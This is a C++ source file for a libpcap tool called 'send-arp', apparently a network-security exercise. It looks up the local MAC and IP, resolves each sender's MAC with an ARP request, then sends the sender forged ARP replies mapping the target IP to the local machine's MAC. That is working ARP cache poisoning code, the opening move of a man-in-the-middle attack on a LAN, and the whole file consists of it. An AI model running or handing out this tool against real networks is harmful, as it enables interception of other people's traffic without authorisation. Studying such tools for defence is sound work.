#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_MAC(char *interface, Mac *myMAC) {
	int fd;
    	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0) return -1;

	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
   	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        	close(fd);
        	return -1;
	}

	*myMAC = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

	close(fd);
	return 0;
}

int get_IP(char *interface, Ip *myIP) {
    	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return -1;

	strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		close(fd);
		return -1;
	}

	struct sockaddr_in* ip = (struct sockaddr_in*)&ifr.ifr_addr;
	*myIP = Ip(ntohl(ip->sin_addr.s_addr));

	close(fd);
	return 0;
}

void send_ARP_req(pcap_t *pcap, Ip srcIP, Mac srcMAC, Ip dstIP) {
	EthArpPacket packet;

        packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
        packet.eth_.smac_ = Mac(srcMAC);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::Size;
        packet.arp_.pln_ = Ip::Size;
        packet.arp_.op_ = htons(ArpHdr::Request);

        packet.arp_.smac_ = Mac(srcMAC);
        packet.arp_.sip_ = htonl(Ip(srcIP));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(dstIP));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }
}

Mac recv_ARP_rep(pcap_t *pcap, Ip srcIP, Ip dstIP, int repeat = 1000) {

	while (repeat--) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

		const EthArpPacket* ARPpacket = reinterpret_cast<const EthArpPacket*>(packet);
		
		if (ntohs(ARPpacket->eth_.type_) != EthHdr::Arp) continue;
		if (ntohs(ARPpacket->arp_.op_) != ArpHdr::Reply) continue;
		if (ntohl(ARPpacket->arp_.sip_) != Ip(srcIP)) continue;
		if (ntohl(ARPpacket->arp_.tip_) != Ip(dstIP)) continue;

        	return ARPpacket->arp_.smac_;
	}

	fprintf(stderr, "Failed to receive ARP reply from %s\n", std::string(srcIP).c_str());
	return Mac();
}

void send_ARP_rep(pcap_t *pcap, Mac srcMAC, Ip dstIP, Mac dstMAC, Ip targetIP) {
        EthArpPacket packet;

        packet.eth_.dmac_ = Mac(dstMAC);
        packet.eth_.smac_ = Mac(srcMAC);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::Size;
        packet.arp_.pln_ = Ip::Size;
        packet.arp_.op_ = htons(ArpHdr::Reply);

        packet.arp_.smac_ = Mac(srcMAC);
        packet.arp_.sip_ = htonl(Ip(targetIP));
        packet.arp_.tmac_ = Mac(dstMAC);
        packet.arp_.tip_ = htonl(Ip(dstIP));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc & 1) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}	


	Mac myMAC;
	Ip  myIP;

	if (get_MAC(dev, &myMAC)){
		fprintf(stderr, "couldn't retrieve MAC address\n");
		return EXIT_FAILURE;
	}
	if (get_IP(dev, &myIP)){
		fprintf(stderr, "couldn't retrieve IP address\n");
		return EXIT_FAILURE;
	}
	printf("[*] my MAC addr : %s\n", std::string(myMAC).c_str());
	printf("[*] my IP addr : %s\n", std::string(myIP).c_str());
	

	for(int i = 2; i < argc; i += 2){
		Mac senderMAC;
		Ip senderIP = Ip(argv[i]);
		Ip targetIP = Ip(argv[i+1]);

		send_ARP_req(pcap, myIP, myMAC, senderIP);
		senderMAC = recv_ARP_rep(pcap, senderIP, myIP);
		printf("[-] sender%d MAC addr : %s\n", i / 2, std::string(senderMAC).c_str());

		send_ARP_rep(pcap, myMAC, senderIP, senderMAC, targetIP);
	}
	pcap_close(pcap);
}
